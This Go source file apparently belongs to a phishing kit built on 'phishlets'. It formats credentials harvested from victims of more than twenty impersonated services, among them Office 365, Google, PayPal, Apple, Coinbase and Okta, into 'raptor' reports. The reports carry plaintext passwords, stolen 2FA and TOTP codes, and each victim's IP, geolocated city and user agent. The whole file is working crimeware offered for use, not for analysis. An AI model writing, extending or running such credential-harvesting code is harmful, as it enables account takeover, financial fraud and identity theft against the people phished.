package core

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

// SessionFormatter handles custom formatting for different phishlets
type SessionFormatter struct {
	geolocator *IPGeolocator
}

// GeoLocation holds geolocation data for an IP
type GeoLocation struct {
	IP          string `json:"ip"`
	City        string `json:"city"`
	Region      string `json:"region"`
	Country     string `json:"country"`
	CountryCode string `json:"country_code"`
	Timezone    string `json:"timezone"`
	ISP         string `json:"isp"`
	Org         string `json:"org"`
}

// IPGeolocator provides IP geolocation services
type IPGeolocator struct {
	cache      map[string]*GeoLocation
	apiBaseURL string
}

// NewSessionFormatter creates a new session formatter
func NewSessionFormatter() *SessionFormatter {
	return &SessionFormatter{
		geolocator: NewIPGeolocator(),
	}
}

// NewIPGeolocator creates a new IP geolocator
func NewIPGeolocator() *IPGeolocator {
	return &IPGeolocator{
		cache:      make(map[string]*GeoLocation),
		apiBaseURL: "http://ip-api.com/json/", // Free geolocation API
	}
}

// Lookup performs IP geolocation lookup
func (g *IPGeolocator) Lookup(ip string) (*GeoLocation, error) {
	// Clean IP (remove port if present)
	if idx := strings.Index(ip, ":"); idx != -1 {
		ip = ip[:idx]
	}
	
	// Check cache
	if cached, ok := g.cache[ip]; ok {
		return cached, nil
	}
	
	// Perform API lookup
	url := g.apiBaseURL + ip
	resp, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	
	var location GeoLocation
	if err := json.Unmarshal(body, &location); err != nil {
		return nil, err
	}
	
	// Cache result
	g.cache[ip] = &location
	
	return &location, nil
}

// FormatSession formats a session based on the phishlet type
func (f *SessionFormatter) FormatSession(session *Session, phishletName string, sessionID int) string {
	// Get geolocation
	location := "Unknown"
	if geo, err := f.geolocator.Lookup(session.RemoteAddr); err == nil {
		if geo.City != "" && geo.Region != "" {
			location = fmt.Sprintf("%s, %s, %s", geo.City, geo.Region, geo.CountryCode)
		} else if geo.Country != "" {
			location = geo.Country
		}
	}
	
	// Format based on phishlet
	switch phishletName {
	case "o365":
		return f.formatO365Session(session, location, sessionID)
	case "google", "gmail":
		return f.formatGoogleSession(session, location, sessionID)
	case "github":
		return f.formatGitHubSession(session, location, sessionID)
	case "slack":
		return f.formatSlackSession(session, location, sessionID)
	case "salesforce":
		return f.formatSalesforceSession(session, location, sessionID)
	case "facebook":
		return f.formatFacebookSession(session, location, sessionID)
	case "twitter":
		return f.formatTwitterSession(session, location, sessionID)
	case "instagram":
		return f.formatInstagramSession(session, location, sessionID)
	case "linkedin":
		return f.formatLinkedInSession(session, location, sessionID)
	case "amazon":
		return f.formatAmazonSession(session, location, sessionID)
	case "paypal":
		return f.formatPayPalSession(session, location, sessionID)
	case "apple":
		return f.formatAppleSession(session, location, sessionID)
	case "netflix":
		return f.formatNetflixSession(session, location, sessionID)
	case "spotify":
		return f.formatSpotifySession(session, location, sessionID)
	case "zoom":
		return f.formatZoomSession(session, location, sessionID)
	case "dropbox":
		return f.formatDropboxSession(session, location, sessionID)
	case "discord":
		return f.formatDiscordSession(session, location, sessionID)
	case "telegram":
		return f.formatTelegramSession(session, location, sessionID)
	case "adobe":
		return f.formatAdobeSession(session, location, sessionID)
	case "coinbase":
		return f.formatCoinbaseSession(session, location, sessionID)
	case "booking":
		return f.formatBookingSession(session, location, sessionID)
	case "okta":
		return f.formatOktaSession(session, location, sessionID)
	case "docusign":
		return f.formatDocuSignSession(session, location, sessionID)
	default:
		return f.formatGenericSession(session, location, sessionID, phishletName)
	}
}

// formatO365Session formats O365/Office 365 session
func (f *SessionFormatter) formatO365Session(session *Session, location string, sessionID int) string {
	// Determine if it's Office365 or GoDaddy based on domain or custom fields
	isGoDaddy := strings.Contains(strings.ToLower(session.Username), "godaddy") ||
		strings.Contains(strings.ToLower(session.Name), "godaddy")
	
	var credentials string
	
	if isGoDaddy {
		// GoDaddy format
		serviceUser := session.Custom["serviceUsername"]
		servicePass := session.Custom["servicePassword"]
		godaddyUser := session.Username
		godaddyPass := session.Password
		
		if serviceUser == "" {
			serviceUser = session.Username
		}
		if servicePass == "" {
			servicePass = session.Password
		}
		
		credentials = fmt.Sprintf(`{
    "serviceUsername": "%s",
    "servicePassword": "%s",
    "godaddyUsername": "%s",
    "godaddyPassword": "%s"
}`, serviceUser, servicePass, godaddyUser, godaddyPass)
	} else {
		// Office 365 format
		credentials = fmt.Sprintf(`{
    "officePassword": "%s",
    "loginFmt": "%s"
}`, session.Password, session.Username)
	}
	
	return fmt.Sprintf(`raptor 🔥 (o365) 🔥
        %s

(##      USER FINGERPRINTS       ##

IP: %s
LOCATION: %s
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
}

// formatGoogleSession formats Google/Gmail session
func (f *SessionFormatter) formatGoogleSession(session *Session, location string, sessionID int) string {
	credentials := fmt.Sprintf(`{
    "email": "%s",
    "password": "%s"
}`, session.Username, session.Password)
	
	return fmt.Sprintf(`raptor 🔥 (google) 🔥
        %s

(##      USER FINGERPRINTS       ##

IP: %s
LOCATION: %s
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
}

// formatGitHubSession formats GitHub session
func (f *SessionFormatter) formatGitHubSession(session *Session, location string, sessionID int) string {
	credentials := fmt.Sprintf(`{
    "username": "%s",
    "password": "%s"
}`, session.Username, session.Password)
	
	return fmt.Sprintf(`raptor 🔥 (github) 🔥
        %s

(##      USER FINGERPRINTS       ##

IP: %s
LOCATION: %s
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
}

// formatSlackSession formats Slack session
func (f *SessionFormatter) formatSlackSession(session *Session, location string, sessionID int) string {
	credentials := fmt.Sprintf(`{
    "email": "%s",
    "password": "%s",
    "workspace": "%s"
}`, session.Username, session.Password, session.Custom["workspace"])
	
	return fmt.Sprintf(`raptor 🔥 (slack) 🔥
        %s

(##      USER FINGERPRINTS       ##

IP: %s
LOCATION: %s
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
}

// formatSalesforceSession formats Salesforce session
func (f *SessionFormatter) formatSalesforceSession(session *Session, location string, sessionID int) string {
	credentials := fmt.Sprintf(`{
    "username": "%s",
    "password": "%s"
}`, session.Username, session.Password)
	
	return fmt.Sprintf(`raptor 🔥 (salesforce) 🔥
        %s

(##      USER FINGERPRINTS       ##

IP: %s
LOCATION: %s
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
}

// formatFacebookSession formats Facebook session
func (f *SessionFormatter) formatFacebookSession(session *Session, location string, sessionID int) string {
	credentials := fmt.Sprintf(`{
    "email": "%s",
    "password": "%s"
}`, session.Username, session.Password)
	
	return fmt.Sprintf(`raptor 🔥 (facebook) 🔥
        %s

(##      USER FINGERPRINTS       ##

IP: %s
LOCATION: %s
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
}

// formatTwitterSession formats Twitter/X session
func (f *SessionFormatter) formatTwitterSession(session *Session, location string, sessionID int) string {
	credentials := fmt.Sprintf(`{
    "username": "%s",
    "password": "%s"
}`, session.Username, session.Password)
	
	return fmt.Sprintf(`raptor 🔥 (twitter) 🔥
        %s

(##      USER FINGERPRINTS       ##

IP: %s
LOCATION: %s
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
}

// formatInstagramSession formats Instagram session
func (f *SessionFormatter) formatInstagramSession(session *Session, location string, sessionID int) string {
	credentials := fmt.Sprintf(`{
    "username": "%s",
    "password": "%s"
}`, session.Username, session.Password)
	
	return fmt.Sprintf(`raptor 🔥 (instagram) 🔥
        %s

(##      USER FINGERPRINTS       ##

IP: %s
LOCATION: %s
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
}

// formatLinkedInSession formats LinkedIn session
func (f *SessionFormatter) formatLinkedInSession(session *Session, location string, sessionID int) string {
	credentials := fmt.Sprintf(`{
    "email": "%s",
    "password": "%s"
}`, session.Username, session.Password)
	
	return fmt.Sprintf(`raptor 🔥 (linkedin) 🔥
        %s

(##      USER FINGERPRINTS       ##

IP: %s
LOCATION: %s
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
}

// formatAmazonSession formats Amazon session
func (f *SessionFormatter) formatAmazonSession(session *Session, location string, sessionID int) string {
	credentials := fmt.Sprintf(`{
    "email": "%s",
    "password": "%s"
}`, session.Username, session.Password)
	
	return fmt.Sprintf(`raptor 🔥 (amazon) 🔥
        %s

(##      USER FINGERPRINTS       ##

IP: %s
LOCATION: %s
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
}

// formatPayPalSession formats PayPal session
func (f *SessionFormatter) formatPayPalSession(session *Session, location string, sessionID int) string {
	credentials := fmt.Sprintf(`{
    "email": "%s",
    "password": "%s"
}`, session.Username, session.Password)
	
	return fmt.Sprintf(`raptor 🔥 (paypal) 🔥
        %s

(##      USER FINGERPRINTS       ##

IP: %s
LOCATION: %s
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
}

// formatAppleSession formats Apple/iCloud session
func (f *SessionFormatter) formatAppleSession(session *Session, location string, sessionID int) string {
	credentials := fmt.Sprintf(`{
    "appleId": "%s",
    "password": "%s"
}`, session.Username, session.Password)
	
	return fmt.Sprintf(`raptor 🔥 (apple) 🔥
        %s

(##      USER FINGERPRINTS       ##

IP: %s
LOCATION: %s
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
}

// formatNetflixSession formats Netflix session
func (f *SessionFormatter) formatNetflixSession(session *Session, location string, sessionID int) string {
	credentials := fmt.Sprintf(`{
    "email": "%s",
    "password": "%s"
}`, session.Username, session.Password)
	
	return fmt.Sprintf(`raptor 🔥 (netflix) 🔥
        %s

(##      USER FINGERPRINTS       ##

IP: %s
LOCATION: %s
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
}

// formatSpotifySession formats Spotify session
func (f *SessionFormatter) formatSpotifySession(session *Session, location string, sessionID int) string {
	credentials := fmt.Sprintf(`{
    "username": "%s",
    "password": "%s"
}`, session.Username, session.Password)
	
	return fmt.Sprintf(`raptor 🔥 (spotify) 🔥
        %s

(##      USER FINGERPRINTS       ##

IP: %s
LOCATION: %s
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
}

// formatZoomSession formats Zoom session
func (f *SessionFormatter) formatZoomSession(session *Session, location string, sessionID int) string {
	credentials := fmt.Sprintf(`{
    "email": "%s",
    "password": "%s"
}`, session.Username, session.Password)
	
	return fmt.Sprintf(`raptor 🔥 (zoom) 🔥
        %s

(##      USER FINGERPRINTS       ##

IP: %s
LOCATION: %s
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
}

// formatDropboxSession formats Dropbox session
func (f *SessionFormatter) formatDropboxSession(session *Session, location string, sessionID int) string {
	credentials := fmt.Sprintf(`{
    "email": "%s",
    "password": "%s"
}`, session.Username, session.Password)
	
	return fmt.Sprintf(`raptor 🔥 (dropbox) 🔥
        %s

(##      USER FINGERPRINTS       ##

IP: %s
LOCATION: %s
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
}

// formatDiscordSession formats Discord session
func (f *SessionFormatter) formatDiscordSession(session *Session, location string, sessionID int) string {
	credentials := fmt.Sprintf(`{
    "email": "%s",
    "password": "%s"
}`, session.Username, session.Password)
	
	return fmt.Sprintf(`raptor 🔥 (discord) 🔥
        %s

(##      USER FINGERPRINTS       ##

IP: %s
LOCATION: %s
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
}

// formatTelegramSession formats Telegram session
func (f *SessionFormatter) formatTelegramSession(session *Session, location string, sessionID int) string {
	credentials := fmt.Sprintf(`{
    "phone": "%s",
    "password": "%s"
}`, session.Username, session.Password)
	
	return fmt.Sprintf(`raptor 🔥 (telegram) 🔥
        %s

(##      USER FINGERPRINTS       ##

IP: %s
LOCATION: %s
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
}

// formatAdobeSession formats Adobe session
func (f *SessionFormatter) formatAdobeSession(session *Session, location string, sessionID int) string {
	credentials := fmt.Sprintf(`{
    "email": "%s",
    "password": "%s"
}`, session.Username, session.Password)
	
	return fmt.Sprintf(`raptor 🔥 (adobe) 🔥
        %s

(##      USER FINGERPRINTS       ##

IP: %s
LOCATION: %s
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
}

// formatCoinbaseSession formats Coinbase session
func (f *SessionFormatter) formatCoinbaseSession(session *Session, location string, sessionID int) string {
	credentials := fmt.Sprintf(`{
    "email": "%s",
    "password": "%s",
    "2fa": "%s"
}`, session.Username, session.Password, session.Custom["two_factor_code"])
	
	return fmt.Sprintf(`raptor 🔥 (coinbase) 🔥
        %s

(##      USER FINGERPRINTS       ##

IP: %s
LOCATION: %s
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
}

// formatBookingSession formats Booking.com session
func (f *SessionFormatter) formatBookingSession(session *Session, location string, sessionID int) string {
	credentials := fmt.Sprintf(`{
    "email": "%s",
    "password": "%s"
}`, session.Username, session.Password)
	
	return fmt.Sprintf(`raptor 🔥 (booking) 🔥
        %s

(##      USER FINGERPRINTS       ##

IP: %s
LOCATION: %s
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
}

// formatOktaSession formats Okta session
func (f *SessionFormatter) formatOktaSession(session *Session, location string, sessionID int) string {
	credentials := fmt.Sprintf(`{
    "username": "%s",
    "password": "%s",
    "mfa": "%s"
}`, session.Username, session.Password, session.Custom["totp_code"])
	
	return fmt.Sprintf(`raptor 🔥 (okta) 🔥
        %s

(##      USER FINGERPRINTS       ##

IP: %s
LOCATION: %s
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
}

// formatDocuSignSession formats DocuSign session
func (f *SessionFormatter) formatDocuSignSession(session *Session, location string, sessionID int) string {
	credentials := fmt.Sprintf(`{
    "email": "%s",
    "password": "%s"
}`, session.Username, session.Password)
	
	return fmt.Sprintf(`raptor 🔥 (docusign) 🔥
        %s

(##      USER FINGERPRINTS       ##

IP: %s
LOCATION: %s
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
}

// formatGenericSession formats any other phishlet
func (f *SessionFormatter) formatGenericSession(session *Session, location string, sessionID int, phishletName string) string {
	credentials := fmt.Sprintf(`{
    "username": "%s",
    "password": "%s"
}`, session.Username, session.Password)
	
	return fmt.Sprintf(`raptor 🔥 (%s) 🔥
        %s

(##      USER FINGERPRINTS       ##

IP: %s
LOCATION: %s
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: %s)`, phishletName, credentials, session.RemoteAddr, location, session.UserAgent)
}

